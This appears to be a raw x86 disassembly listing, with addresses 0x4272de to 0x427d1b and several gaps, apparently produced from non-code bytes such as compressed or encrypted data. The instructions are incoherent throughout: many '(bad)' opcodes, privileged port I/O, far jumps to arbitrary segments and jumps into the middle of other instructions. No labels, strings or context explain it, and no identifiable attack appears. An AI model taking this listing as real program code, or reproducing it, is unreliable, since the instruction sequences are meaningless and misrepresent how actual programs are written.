  4272de:	cmc    
  4272df:	mov    dh,0x13
  4272e1:	pop    ds
  4272e2:	ins    BYTE PTR es:[edi],dx
  4272e3:	jae    0x42726e
  4272e5:	test   eax,0x6ebe264c
  4272ea:	jg     0x42729f
  4272ec:	adc    DWORD PTR [edx],esi
  4272ee:	or     ebp,ebx
  4272f0:	repnz sar DWORD PTR [eax],cl
  4272f3:	xchg   ecx,eax
  4272f4:	sbb    ah,BYTE PTR [esi-0x4d]
  4272f7:	adc    eax,0x49bb8dd4
  4272fc:	add    DWORD PTR [ecx-0x4b69ff81],0xffffff9c
  427303:	add    BYTE PTR [edx],ah
  427305:	adc    al,0x15
  427307:	rcl    eax,1
  427309:	pop    eax
  42730a:	ss cld 
  42730c:	popa   
  42730d:	mov    ch,0x69
  42730f:	inc    esi
  427310:	jae    0x427318
  427312:	scas   al,BYTE PTR es:[edi]
  427313:	xor    eax,DWORD PTR [edx+esi*4+0xe]
  427317:	mov    esp,0xabd7182c
  42731c:	sub    ch,bl
  42731e:	out    dx,eax
  42731f:	stos   DWORD PTR es:[edi],eax
  427320:	(bad)  
  427321:	pop    esp
  427322:	or     al,0x93
  427324:	hlt    
  427325:	ja     0x42739f
  427327:	fst    st(1)
  427329:	mov    dl,0x62
  42732b:	add    al,0xe4
  42732d:	sbb    eax,DWORD PTR gs:[eax]
  427330:	cmp    dh,bh
  427332:	je     0x427324
  427334:	pop    ds
	...
  427395:	add    BYTE PTR [edx],dl
  427397:	sbb    eax,0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	icebp  
  4273a3:	mov    ebx,0xa28f5458
  4273a8:	add    DWORD PTR [eax],eax
  4273aa:	pop    es
  4273ab:	add    DWORD PTR [eax],eax
  4273ad:	add    BYTE PTR [eax+0x7135bf33],al
  4273b3:	mov    edx,0x252383ef
  4273b8:	test   DWORD PTR [ebx],esp
  4273ba:	mov    WORD PTR [eax],?
  4273bc:	inc    ecx
  4273bd:	pmulhuw mm5,mm1
  4273c0:	fdiv   DWORD PTR [ecx]
  4273c2:	pop    es
  4273c3:	fs jb  0x4273a2
  4273c6:	jnp    0x4273c2
  4273c8:	add    al,0xfb
  4273ca:	mov    ds:0x2e3366d,eax
  4273cf:	in     eax,dx
  4273d0:	in     al,dx
  4273d1:	sahf   
  4273d2:	test   DWORD PTR [edx+eiz*8-0x699b5966],ecx
  4273d9:	inc    edi
  4273da:	sub    BYTE PTR [ebx-0x67],ah
  4273dd:	mov    ecx,0xba022dc9
  4273e2:	inc    esi
  4273e3:	push   0xffffffca
  4273e5:	adc    dl,BYTE PTR [edx]
  4273e7:	or     BYTE PTR [ebp+0x3106f55a],bl
  4273ed:	mov    bl,al
  4273ef:	mov    bh,0x43
  4273f1:	out    dx,al
  4273f2:	push   0x1b729703
  4273f7:	mov    ecx,0xfe8a47ce
  4273fc:	xor    edx,DWORD PTR [edi-0x52]
  4273ff:	mov    ecx,0xef00e465
  427404:	fimul  WORD PTR [ebx+edx*4+0x3faf1330]
  42740b:	adc    al,0x61
  42740d:	push   ecx
  42740e:	jmp    DWORD PTR [eax+0xef62b01]
  427414:	call   DWORD PTR [ebx-0x27]
  427417:	(bad)  
  427418:	je     0x427401
  42741a:	mov    BYTE PTR [ecx-0x62],0x28
  42741e:	sbb    al,0x4a
  427420:	cmp    eax,0x4e6005f8
  427425:	sub    ecx,DWORD PTR [ebx-0x76]
  427428:	fpatan 
  42742a:	jp     0x4273ad
  42742c:	std    
  42742d:	popa   
  42742e:	lahf   
  42742f:	ret    
  427430:	mov    esp,0xf48f03f2
  427435:	inc    esp
  427436:	fst    QWORD PTR [ebp-0x79104927]
  42743c:	mov    al,0x23
  42743e:	and    BYTE PTR [ebp-0xa],al
  427441:	mov    al,ds:0x5a188a89
  427446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427447:	or     cl,BYTE PTR [ecx]
  427449:	out    dx,al
  42744a:	inc    eax
  42744b:	ins    BYTE PTR es:[edi],dx
  42744c:	repz push edi
  42744e:	clc    
  42744f:	cli    
  427450:	sub    BYTE PTR [ebx],dl
  427452:	arpl   WORD PTR [esi+0x6347a454],bp
  427458:	lods   eax,DWORD PTR ds:[esi]
  427459:	ins    BYTE PTR es:[edi],dx
  42745a:	retf   0x100a
  42745d:	pop    ebx
  42745e:	std    
  42745f:	and    eax,0xc638fed7
  427464:	jge    0x427445
  427466:	xchg   BYTE PTR [bx+di],ah
  427469:	loopne 0x4274ab
  42746b:	push   0x7a839747
  427470:	xchg   ebx,eax
  427471:	sbb    ecx,DWORD PTR [edi]
  427473:	clc    
  427474:	aaa    
  427475:	dec    ebp
  427476:	jg     0x427457
  427478:	cmp    eax,0x86540fbb
  42747d:	jmp    0x23c6543b
  427482:	ror    ebp,0x6c
  427485:	cmp    BYTE PTR [edx+esi*4+0x6a28471],0xba
  42748d:	xchg   esi,eax
  42748e:	mov    ch,0x8e
  427490:	into   
  427491:	and    DWORD PTR [edi],esp
  427493:	add    bl,BYTE PTR [esi+edx*8+0x7472cdc6]
  42749a:	out    dx,eax
  42749b:	sbb    BYTE PTR [ebx],cl
  42749d:	ja     0x42748a
  42749f:	or     bl,BYTE PTR [ebp+0x423603a8]
  4274a5:	jmp    0x26e6:0x8e8c96dc
  4274ac:	inc    edx
  4274ad:	mov    bl,0x1d
  4274af:	(bad)  
  4274b0:	jg     0x4274fb
  4274b2:	loopne 0x4274af
  4274b4:	in     eax,0x0
	...
  427516:	pop    esp
  427517:	test   al,0xc0
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x27a6f50a]
  427523:	mov    esp,0xa396fed4
  427528:	add    DWORD PTR [eax],eax
  42752a:	pop    es
  42752b:	add    DWORD PTR [eax],eax
  42752d:	add    BYTE PTR [eax+0xa],cl
  427530:	mov    eax,ds:0x6025e687
  427535:	push   ecx
  427536:	jp     0x42756b
  427538:	stos   BYTE PTR es:[edi],al
  427539:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42753a:	jl     0x4274f9
  42753c:	and    ecx,DWORD PTR [ecx]
  42753e:	jb     0x427502
  427540:	stc    
  427541:	lods   eax,DWORD PTR ds:[esi]
  427542:	push   0xffffff98
  427544:	rcl    BYTE PTR [edx+0x1479e0be],0x4a
  42754b:	mov    eax,ds:0x663def00
  427550:	jmp    0x9b95023e
  427555:	(bad)  
  427556:	lock xor al,0x21
  427559:	loop   0x42750b
  42755b:	sub    ah,BYTE PTR [ebp+0x60]
  42755e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42755f:	push   cs
  427560:	pop    ebp
  427561:	jnp    0x427564
  427563:	(bad)  
  427564:	ret    
  427565:	adc    ah,BYTE PTR [ecx+edi*2]
  427568:	aad    0x32
  42756a:	inc    esp
  42756b:	loope  0x42754d
  42756d:	add    BYTE PTR [ecx-0x7fd776ec],dl
  427573:	jno    0x4275d6
  427575:	(bad)  
  427576:	sbb    eax,DWORD PTR ds:0x655b5ce9
  42757c:	lods   al,BYTE PTR ds:[si]
  42757e:	push   ss
  42757f:	inc    eax
  427580:	cmp    eax,0x78008622
  427585:	nop
  427586:	loop   0x4275d7
  427588:	aas    
  427589:	lds    ecx,FWORD PTR [eax]
  42758b:	fcomp  QWORD PTR [ebx+esi*2-0x7e]
  42758f:	pop    esp
  427590:	(bad)  
  427591:	nop
  427592:	jmp    0x83d6:0xca85c40d
  427599:	aad    0xb
  42759b:	sti    
  42759c:	xchg   ebx,eax
  42759d:	fsubr  QWORD PTR [edi]
  42759f:	sbb    bh,bl
  4275a1:	xor    ch,bh
  4275a3:	add    BYTE PTR [edx],ch
  4275a5:	mov    es,eax
  4275a7:	mov    ah,0x59
  4275a9:	jns    0x42752b
  4275ab:	lods   al,BYTE PTR ds:[esi]
  4275ac:	inc    esi
  4275ad:	cmc    
  4275ae:	xchg   ecx,eax
  4275af:	ret    0x5a6b
  4275b2:	sbb    esp,DWORD PTR [ebx]
  4275b4:	push   esp
  4275b5:	lods   eax,DWORD PTR ds:[esi]
  4275b6:	fcmovne st,st(3)
  4275b8:	fsub   DWORD PTR [eax]
  4275ba:	adc    BYTE PTR ds:0x94164b83,0x3f
  4275c1:	(bad)  
  4275c2:	pop    esi
  4275c3:	mov    esi,0xba06161e
  4275c8:	aaa    
  4275c9:	in     eax,dx
  4275ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275cb:	jns    0x427597
  4275cd:	push   edi
  4275ce:	test   BYTE PTR ds:0x1a88a848,al
  4275d4:	mov    ds:0x73b0f6b2,eax
  4275d9:	pop    ebx
  4275da:	add    eax,DWORD PTR [esi-0xb]
  4275dd:	sbb    eax,0x955a4d58
  4275e2:	addr16 psubsb mm1,mm5
  4275e6:	aad    0xac
  4275e8:	pusha  
  4275e9:	inc    eax
  4275ea:	ja     0x4275dd
  4275ec:	leave  
  4275ed:	cmp    ecx,DWORD PTR ds:0xc60c90ac
  4275f3:	retf   0x8edc
  4275f6:	stos   BYTE PTR es:[edi],al
  4275f7:	(bad)  
  4275f8:	mov    fs,WORD PTR [edi-0x20]
  4275fb:	leave  
  4275fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4275fd:	sub    al,0xbf
  4275ff:	fnstsw WORD PTR [edx]
  427601:	call   0xee875b5e
  427606:	fs xor al,ch
  427609:	pushf  
  42760a:	pop    esp
  42760b:	scas   al,BYTE PTR es:[edi]
  42760c:	cmp    BYTE PTR [eax+eiz*2+0x14],dh
  427610:	sbb    al,0x86
  427612:	jecxz  0x42768d
  427614:	push   0x6b
  427616:	out    0xc,eax
  427618:	jmp    0x7f11096b
  42761d:	js     0x427667
  42761f:	imul   ecx,DWORD PTR [ebp+eiz*2-0x58],0xdaf572e8
  427627:	popf   
  427628:	inc    esp
  427629:	push   esp
  42762a:	inc    BYTE PTR [ecx]
  42762c:	mov    ebx,0x7b4d3327
  427631:	xor    eax,0x44e6ea
	...
  427696:	add    DWORD PTR [esi-0x70],edx
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x796ca27
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    ch,dl
  4276af:	xchg   BYTE PTR [edi],dl
  4276b1:	out    0x70,eax
  4276b3:	out    dx,eax
  4276b4:	mov    ebp,0xf6926259
  4276b9:	and    al,0x45
  4276bb:	std    
  4276bc:	mov    esi,0x754c8dcd
  4276c1:	(bad)  
  4276c2:	push   ebx
  4276c3:	scas   eax,DWORD PTR es:[edi]
  4276c4:	movq   mm2,QWORD PTR [ecx]
  4276c7:	or     BYTE PTR [edx],ch
  4276c9:	dec    edx
  4276ca:	adc    ebx,ebx
  4276cc:	fs jne 0x42768a
  4276cf:	loop   0x427711
  4276d1:	add    eax,ebx
  4276d3:	adc    bh,cl
  4276d5:	xchg   esi,eax
  4276d6:	pop    edi
  4276d7:	xchg   bl,bl
  4276d9:	adc    eax,0x59345b17
  4276de:	cwde   
  4276df:	pop    ecx
  4276e0:	cs xchg al,ah
  4276e3:	inc    edx
  4276e4:	dec    edx
  4276e5:	xor    al,0x8a
  4276e7:	out    0xdc,eax
  4276e9:	cmp    ebx,DWORD PTR [esi+0x3d]
  4276ec:	imul   ecx,DWORD PTR [ecx],0x37501caa
  4276f2:	jecxz  0x427683
  4276f4:	lahf   
  4276f5:	imul   edi,DWORD PTR [ecx+ebx*8],0xffffff9c
  4276f9:	(bad)  
  4276fa:	mov    eax,ds:0x2c440cd7
  4276ff:	mov    dh,0xe
  427701:	rcr    DWORD PTR [esi],cl
  427703:	gs dec edi
  427705:	pop    esi
  427706:	inc    edi
  427707:	loope  0x42777c
  427709:	and    edx,DWORD PTR [esi]
  42770b:	mul    cl
  42770d:	lods   al,BYTE PTR ds:[esi]
  42770e:	mov    bh,0x28
  427710:	loope  0x4276e7
  427712:	out    0xac,al
  427714:	mov    bh,BYTE PTR [esi+0x196152e]
  42771a:	xchg   ecx,eax
  42771b:	jo     0x4276ac
  42771d:	lods   al,BYTE PTR ds:[esi]
  42771e:	das    
  42771f:	cs (bad) 
  427721:	mov    ebx,0x56bcf132
  427726:	xor    DWORD PTR [eax-0x8],esp
  427729:	mov    ebx,0x866608b4
  42772e:	or     ah,dh
  427730:	mov    bl,0xfb
  427732:	out    dx,eax
  427733:	test   ah,dl
  427735:	pop    ecx
  427736:	push   esi
  427737:	clc    
  427738:	jne    0x4276d6
  42773a:	dec    esp
  42773b:	icebp  
  42773c:	pop    esp
  42773d:	or     BYTE PTR [ebp+0x70],dl
  427740:	(bad)  
  427741:	fadd   st,st(4)
  427743:	sbb    BYTE PTR [ecx+0xb],ah
  427746:	mov    ebx,0x47b4da42
  42774b:	jae    0x427737
  42774d:	bound  ebp,QWORD PTR [ecx-0xcacac6a]
  427753:	data16 repnz in al,dx
  427756:	aad    0x30
  427758:	mov    ah,BYTE PTR [ebp-0x2480313e]
  42775e:	fst    QWORD PTR [ebp+0x2f821307]
  427764:	xor    al,cl
  427766:	retf   
  427767:	aaa    
  427768:	xor    al,0x4f
  42776a:	int    0xe
  42776c:	pop    eax
  42776d:	popf   
  42776e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42776f:	ror    DWORD PTR [edx+0x68f23600],cl
  427775:	xchg   edx,eax
  427776:	in     al,0xc6
  427778:	out    0x86,al
  42777a:	imul   DWORD PTR [ebx]
  42777c:	in     al,0x31
  42777e:	xchg   esp,eax
  42777f:	in     al,0x56
  427781:	jb     0x427716
  427783:	call   0xf903b881
  427788:	xor    ebp,DWORD PTR [ebp+0x55]
  42778b:	dec    esp
  42778c:	inc    edi
  42778d:	and    dh,cl
  42778f:	fild   DWORD PTR [ebp+0x1b922efc]
  427795:	test   al,0x49
  427797:	mov    dh,0x7f
  427799:	mov    bh,0xd
  42779b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42779c:	mov    cl,0x7b
  42779e:	mov    ecx,0x90a285f
  4277a3:	jle    0x427725
  4277a5:	mov    WORD PTR [eax+0x42],es
  4277a8:	adc    al,0x27
  4277aa:	je     0x4277dc
  4277ac:	push   es
  4277ad:	sahf   
  4277ae:	out    dx,eax
  4277af:	leave  
  4277b0:	ja     0x42778a
  4277b2:	addr16 pop eax
  4277b4:	cdq    
	...
  427815:	add    BYTE PTR [edx],bl
  427817:	mov    cl,BYTE PTR [ebx]
  427819:	inc    ebp
  42781a:	fwait
  42781b:	lds    ebx,FWORD PTR [esi-0x21]
  42781e:	push   edx
  42781f:	sar    DWORD PTR [edi+eiz*1],1
  427822:	retf   0x895c
  427825:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    ah,dh
  42782f:	xor    dl,ah
  427831:	std    
  427832:	retf   0x5c0d
  427835:	sub    eax,0xcdbc37fd
  42783a:	lods   eax,DWORD PTR ds:[esi]
  42783b:	and    al,0xc1
  42783d:	aaa    
  42783e:	mov    ebp,0x9e8a58a0
  427843:	add    bl,BYTE PTR [edi+eax*4+0x266bc164]
  42784a:	into   
  42784b:	int    0xbb
  42784d:	mov    ecx,0xf73d9026
  427852:	sbb    edi,DWORD PTR [bx+di]
  427855:	dec    eax
  427856:	loopne 0x4278bb
  427858:	xchg   esi,eax
  427859:	mov    al,0xad
  42785b:	stc    
  42785c:	sbb    DWORD PTR [ebx+ebx*8+0x48],edi
  427860:	(bad)  
  427861:	xor    al,0xfb
  427863:	mov    al,ds:0x9253f9fa
  427868:	cmc    
  427869:	sbb    ecx,DWORD PTR [ecx+0x6372d133]
  42786f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427870:	call   0x31066f14
  427875:	icebp  
  427876:	imul   eax,DWORD PTR gs:[ebx],0x7f88ebff
  42787d:	jmp    0x965cb2a3
  427882:	mov    eax,0x49f2b59c
  427887:	ds dec esp
  427889:	fisttp QWORD PTR [edi+0x41995751]
  42788f:	sub    dh,BYTE PTR [ebx+0x55fb86a2]
  427895:	lods   eax,DWORD PTR ds:[esi]
  427896:	ss jae 0x427861
  427899:	ror    edi,cl
  42789b:	jg     0x4278c3
  42789d:	mov    WORD PTR [eax-0x59],ss
  4278a0:	jl     0x427897
  4278a2:	adc    BYTE PTR [edx],ch
  4278a4:	retf   0x11f3
  4278a7:	pop    ds
  4278a8:	mov    ds:0x4e79a70d,eax
  4278ad:	mov    dh,0x7f
  4278af:	lock mov ah,0x68
  4278b2:	dec    edi
  4278b3:	pushf  
  4278b4:	sar    BYTE PTR [ebp-0x64],cl
  4278b7:	aad    0xd8
  4278b9:	push   esi
  4278ba:	into   
  4278bb:	popa   
  4278bc:	mov    ah,0x7e
  4278be:	jno    0x4278a0
  4278c0:	jmp    0x427910
  4278c2:	loope  0x427889
  4278c4:	cmc    
  4278c5:	mov    edx,0x1d076a97
  4278ca:	aam    0x82
  4278cc:	outs   dx,DWORD PTR ds:[esi]
  4278cd:	outs   dx,DWORD PTR ds:[esi]
  4278ce:	(bad)  
  4278cf:	cmp    al,0x36
  4278d1:	push   eax
  4278d2:	xchg   edx,ebx
  4278d4:	dec    edi
  4278d5:	and    esi,DWORD PTR [ebx+0x6a]
  4278d8:	xor    dh,dh
  4278da:	xchg   ebp,eax
  4278db:	dec    edi
  4278dc:	(bad)  
  4278de:	loop   0x4278c3
  4278e0:	jbe    0x427871
  4278e2:	mov    eax,0xe087aee2
  4278e7:	xchg   edx,eax
  4278e8:	ins    BYTE PTR es:[edi],dx
  4278e9:	dec    esp
  4278ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278eb:	xchg   ecx,eax
  4278ec:	mov    dh,0x7c
  4278ee:	and    ebx,DWORD PTR [esi-0x45801e51]
  4278f4:	loopne 0x4278df
  4278f6:	inc    edx
  4278f7:	arpl   WORD PTR ds:0xbffacf72,si
  4278fd:	xchg   ebx,eax
  4278fe:	pop    eax
  4278ff:	daa    
  427900:	adc    BYTE PTR [ebp+0xd],0xab
  427904:	cmp    esi,edx
  427906:	ins    BYTE PTR es:[edi],dx
  427907:	ds jmp 0x75be7737
  42790d:	add    dh,ah
  42790f:	pop    ecx
  427910:	and    BYTE PTR ss:[esi+ebp*8-0x4627d264],al
  427918:	push   ebp
  427919:	mov    ds:0xf623d453,eax
  42791e:	push   ebp
  42791f:	inc    esp
  427920:	xor    bh,BYTE PTR [edx+0x28]
  427923:	es mov esi,0xf356511
  427929:	call   0x251b:0x486bdb7e
  427930:	pop    esp
  427931:	sti    
  427932:	cmp    ah,BYTE PTR [edi+eax*4+0x0]
	...
  427996:	call   0xdea3:0xffa3ffdd
  42799d:	std    
  42799e:	in     eax,0x63
  4279a0:	mov    ebx,0xf8b4dcd0
  4279a5:	mov    edx,0x1a6ab
  4279aa:	pop    es
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR [edi-0x36],bh
  4279b0:	mov    es,esi
  4279b2:	test   al,0x1e
  4279b4:	inc    esp
  4279b5:	adc    BYTE PTR [edx],al
  4279b7:	jecxz  0x427a31
  4279b9:	inc    eax
  4279ba:	(bad)  
  4279bb:	push   ebx
  4279bc:	arpl   sp,di
  4279be:	(bad)  
  4279bf:	in     eax,dx
  4279c0:	out    dx,eax
  4279c1:	cs (bad) 
  4279c3:	mov    esp,0x59635cfb
  4279c8:	xor    dh,BYTE PTR [edi]
  4279ca:	popa   
  4279cb:	pop    esp
  4279cc:	fdiv   QWORD PTR [eax-0x14]
  4279cf:	mov    bh,0xd5
  4279d1:	mov    fs,WORD PTR [ebx+0x72e891d0]
  4279d7:	jl     0x427997
  4279d9:	test   al,0x85
  4279db:	fisub  WORD PTR [ebx-0x4844afc0]
  4279e1:	mov    ecx,0x7c067f8e
  4279e6:	int    0x18
  4279e8:	inc    esi
  4279e9:	aas    
  4279ea:	jmp    0xa13276b0
  4279ef:	arpl   WORD PTR [edi-0x41],cx
  4279f2:	cld    
  4279f3:	sbb    ebp,ebx
  4279f5:	scas   eax,DWORD PTR es:[edi]
  4279f6:	(bad)  
  4279f7:	ins    DWORD PTR es:[edi],dx
  4279f8:	scas   eax,DWORD PTR es:[edi]
  4279f9:	sbb    BYTE PTR [edx+ecx*8+0x24df5d83],ah
  427a00:	mov    ah,0xec
  427a02:	adc    BYTE PTR ds:0xf31aa6cb,ah
  427a08:	pop    esi
  427a09:	loopne 0x427a4f
  427a0b:	sub    bh,bh
  427a0d:	xor    BYTE PTR [ebp+0x50],bl
  427a10:	ds jecxz 0x4279c0
  427a13:	jnp    0x4279e5
  427a15:	fld    QWORD PTR [ebp+0x12]
  427a18:	xor    al,0xa8
  427a1a:	cs jne 0x4279fd
  427a1d:	cld    
  427a1e:	mov    dl,0x3d
  427a20:	mov    esp,0x21bd8256
  427a25:	dec    ebx
  427a26:	jmp    0xe737:0xf6fc15ac
  427a2d:	mov    al,0x3a
  427a2f:	sbb    eax,0x8e82ea3c
  427a34:	fs adc bl,0xfe
  427a38:	aaa    
  427a39:	add    BYTE PTR [eax],cl
  427a3b:	je     0x427a2f
  427a3d:	lahf   
  427a3e:	inc    edx
  427a3f:	scas   al,BYTE PTR es:[edi]
  427a40:	dec    ebp
  427a41:	in     al,dx
  427a42:	mov    bl,BYTE PTR [esi+ecx*8-0x6]
  427a46:	shr    BYTE PTR [esp+eiz*4+0x2e525524],0x4c
  427a4e:	xchg   esp,eax
  427a4f:	gs nop
  427a51:	cld    
  427a52:	jp     0x4279e3
  427a54:	test   ecx,ebx
  427a56:	cdq    
  427a57:	dec    edx
  427a58:	(bad)  
  427a59:	pop    ss
  427a5a:	fbld   TBYTE PTR [ecx+0x736ccc90]
  427a60:	sbb    ecx,DWORD PTR [esi-0x6a7c693a]
  427a66:	bound  edi,QWORD PTR [edx]
  427a68:	sahf   
  427a69:	xor    BYTE PTR [edi+0x32c497f],0xb4
  427a70:	test   al,0x92
  427a72:	out    0xb4,eax
  427a74:	mov    ebp,0xc9c4ace5
  427a79:	outs   dx,DWORD PTR ds:[esi]
  427a7a:	jne    0x427aaf
  427a7c:	xchg   edx,eax
  427a7d:	std    
  427a7e:	sbb    DWORD PTR [esp+ebx*8],0x186f77c5
  427a85:	fwait
  427a86:	push   ecx
  427a87:	aam    0xbd
  427a89:	mov    dl,0x2a
  427a8b:	push   cs
  427a8c:	call   0x3f6e:0x492bbb2c
  427a93:	jno    0x427a34
  427a95:	or     DWORD PTR [ebx+esi*2],esp
  427a98:	into   
  427a99:	in     eax,dx
  427a9a:	daa    
  427a9b:	in     eax,dx
  427a9c:	mov    esp,0x1f282200
  427aa1:	aam    0x8d
  427aa3:	xor    eax,0x206c1b96
  427aa8:	and    esp,DWORD PTR [eax-0x2313bd14]
  427aae:	or     ch,BYTE PTR [edx-0x5927b7a4]
  427ab4:	mov    ebp,0x0
	...
  427b15:	add    dl,cl
  427b17:	mov    edx,DWORD PTR [edx+0x7b]
  427b1a:	push   ebx
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	adc    DWORD PTR [esi-0x58],edx
  427b25:	nop
  427b26:	mov    dl,0xa7
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [eax-0x50],ah
  427b30:	lock add DWORD PTR [ebx+eiz*2],esi
  427b34:	mov    cl,0x62
  427b36:	sub    ecx,DWORD PTR [edx-0x78a6f7a8]
  427b3c:	jbe    0x427ad8
  427b3e:	mov    ebx,0x8643ac0f
  427b43:	jbe    0x427b9b
  427b45:	in     eax,0x9a
  427b47:	sbb    ah,BYTE PTR [edx-0x2b1e4af5]
  427b4d:	fwait
  427b4e:	daa    
  427b4f:	push   ds
  427b50:	pop    eax
  427b51:	sbb    BYTE PTR [edi-0x3a],ah
  427b54:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427b56:	clc    
  427b57:	adc    edi,esi
  427b59:	shr    BYTE PTR [edi+0x38],0x20
  427b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b5e:	jl     0x59b625af
  427b64:	cli    
  427b65:	mov    ds:0xf2698cba,al
  427b6a:	fisubr DWORD PTR [esi+0x15]
  427b6d:	mov    ds:0x59ccb02,eax
  427b72:	cs gs xchg ebx,eax
  427b75:	daa    
  427b76:	push   es
  427b77:	pop    edx
  427b78:	cli    
  427b79:	mov    BYTE PTR [ebx],al
  427b7b:	mov    cl,0xd0
  427b7d:	out    0x8,al
  427b7f:	adc    ebp,DWORD PTR [edi+0xeae00ea]
  427b85:	add    eax,0x3056586c
  427b8a:	jne    0x427b62
  427b8c:	mov    al,0xf6
  427b8e:	push   ebx
  427b8f:	push   ss
  427b90:	sbb    eax,0x2b46c2b0
  427b95:	push   ss
  427b96:	in     al,0x90
  427b98:	push   ebp
  427b99:	mov    ebp,0xa3300ddf
  427b9e:	sub    cl,BYTE PTR [edx-0x30276614]
  427ba4:	mov    edx,0xf5f02a9b
  427ba9:	and    al,0xe1
  427bab:	out    dx,al
  427bac:	sub    edx,DWORD PTR [edi+0x68c6d46f]
  427bb2:	mov    DWORD PTR [ebx-0x9df221d],0x9429bd7e
  427bbc:	(bad)  
  427bbd:	cmp    al,0x5f
  427bbf:	icebp  
  427bc0:	xor    eax,0x1ecf603
  427bc5:	test   eax,0xd2e355f2
  427bca:	fidivr DWORD PTR [ebp-0x66]
  427bcd:	xor    al,0xb8
  427bcf:	(bad)  
  427bd0:	or     al,0x71
  427bd2:	sbb    ah,al
  427bd4:	add    ecx,DWORD PTR [edx+ebx*8]
  427bd7:	cdq    
  427bd8:	test   al,0xb6
  427bda:	(bad)  
  427bdc:	mov    ds:0xf46db5ed,al
  427be1:	(bad)  
  427be2:	dec    ebx
  427be3:	mov    eax,0x8079f2d2
  427be8:	loope  0x427bbf
  427bea:	retf   
  427beb:	dec    edi
  427bec:	jb     0x427b9e
  427bee:	push   ss
  427bef:	adc    ah,0xc
  427bf2:	adc    cl,BYTE PTR [edi-0x4d0bb369]
  427bf8:	mov    esi,0x3cde112f
  427bfd:	push   esi
  427bfe:	rcl    DWORD PTR [esi+0x58],1
  427c01:	iret   
  427c02:	push   0xb179c7f5
  427c07:	push   ecx
  427c08:	out    0x28,al
  427c0a:	inc    edx
  427c0b:	jmp    0x427ba6
  427c0d:	mov    eax,edi
  427c0f:	in     eax,0x54
  427c11:	loopne 0x427c8e
  427c13:	ins    BYTE PTR es:[edi],dx
  427c14:	push   edi
  427c15:	popa   
  427c16:	push   edx
  427c17:	dec    edi
  427c18:	pop    esi
  427c19:	outs   dx,BYTE PTR ds:[esi]
  427c1a:	(bad)  
  427c1b:	fild   WORD PTR [edi-0x52ea95c0]
  427c21:	pop    ss
  427c22:	mov    ecx,0xe321b1f3
  427c27:	xchg   esi,eax
  427c28:	and    bl,dh
  427c2a:	loope  0x427c28
  427c2c:	add    al,0x72
  427c2e:	or     al,al
  427c30:	mov    al,0x82
  427c32:	nop
  427c33:	repz xchg ebx,eax
	...
  427c95:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0x6c990b85
  427ca5:	sbb    edi,DWORD PTR [ecx+0x70001a8]
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    dh,bl
  427caf:	mov    edi,0x44d3b63a
  427cb4:	mov    ah,BYTE PTR [ecx-0x1b]
  427cb7:	popf   
  427cb8:	push   edx
  427cb9:	out    dx,eax
  427cba:	aad    0xec
  427cbc:	push   ss
  427cbd:	rol    DWORD PTR [ecx-0x7c82e35b],0xbe
  427cc4:	xchg   edx,eax
  427cc5:	sbb    edi,edx
  427cc7:	rcl    edi,1
  427cc9:	leave  
  427cca:	xor    al,0xea
  427ccc:	daa    
  427ccd:	mov    edx,0xf7e33255
  427cd2:	dec    ebx
  427cd3:	inc    eax
  427cd4:	imul   ebx,DWORD PTR [eax+0x78c8b920],0x60
  427cdb:	push   ss
  427cdc:	das    
  427cdd:	jns    0x427ca3
  427cdf:	repz mov ecx,0x10e8c281
  427ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ce6:	push   es
  427ce7:	xchg   ebx,eax
  427ce8:	mov    WORD PTR [eax-0xd],fs
  427ceb:	push   ss
  427cec:	and    al,0xd2
  427cee:	enter  0x8aaa,0xb8
  427cf2:	sub    BYTE PTR ds:[edx-0x46],al
  427cf6:	lds    esp,FWORD PTR [ebx-0x1a]
  427cf9:	imul   edi,ebp,0xffffffb8
  427cfc:	repnz imul eax,DWORD PTR [edi-0x58],0x4a45b607
  427d04:	mov    bl,0x38
  427d06:	dec    edx
  427d07:	sbb    bl,BYTE PTR [ecx]
  427d09:	popa   
  427d0a:	aaa    
  427d0b:	fcomp  QWORD PTR [edi+0x77]
  427d0e:	dec    esp
  427d0f:	xor    al,0x11
  427d11:	movaps xmm4,XMMWORD PTR [edx-0x26]
  427d15:	xchg   ebp,eax
  427d16:	popf   
  427d17:	in     eax,0xd
  427d19:	sbb    al,0xb3
  427d1b:	out    dx,eax
